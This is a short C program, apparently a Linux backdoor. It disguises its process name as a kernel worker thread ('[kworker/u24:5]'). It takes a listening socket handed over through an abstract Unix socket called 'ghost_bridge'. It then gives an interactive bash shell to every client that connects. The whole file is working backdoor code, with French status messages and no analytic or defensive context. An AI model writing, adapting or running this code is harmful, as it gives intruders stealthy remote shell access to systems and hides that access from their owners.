#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/prctl.h>

int receive_fd(int unix_sock) {
    struct msghdr msg = {0};
    char buf[CMSG_SPACE(sizeof(int))];
    struct iovec io = { .iov_base = "SYNC", .iov_len = 4 };
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    msg.msg_control = buf;
    msg.msg_controllen = sizeof(buf);

    if (recvmsg(unix_sock, &msg, 0) < 0) return -1;

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    if (cmsg && cmsg->cmsg_type == SCM_RIGHTS)
        return *((int *)CMSG_DATA(cmsg));
    return -1;
}

int main() {
    int l_fd, c_fd, ghost_sk;
    struct sockaddr_un addr = { .sun_family = AF_UNIX };
    addr.sun_path[0] = '\0';
    strncpy(addr.sun_path + 1, "ghost_bridge", sizeof(addr.sun_path) - 2);

    prctl(PR_SET_NAME, "[kworker/u24:5]", 0, 0, 0);

    l_fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (bind(l_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) return 1;
    listen(l_fd, 1);

    printf("[*] En attente du FD...\n");
    c_fd = accept(l_fd, NULL, NULL);
    ghost_sk = receive_fd(c_fd);
    close(c_fd); close(l_fd);

    if (ghost_sk < 0) return 1;
    printf("[+] Mode ghost actif sur FD %d\n", ghost_sk);

    while (1) {
        int cl = accept(ghost_sk, NULL, NULL);
        if (cl >= 0) {
            if (fork() == 0) {
                dup2(cl, 0); dup2(cl, 1); dup2(cl, 2);
                execl("/bin/bash", "bash", "--noprofile", "-i", NULL);
                exit(0);
            }
            close(cl);
        }
    }
    return 0;
}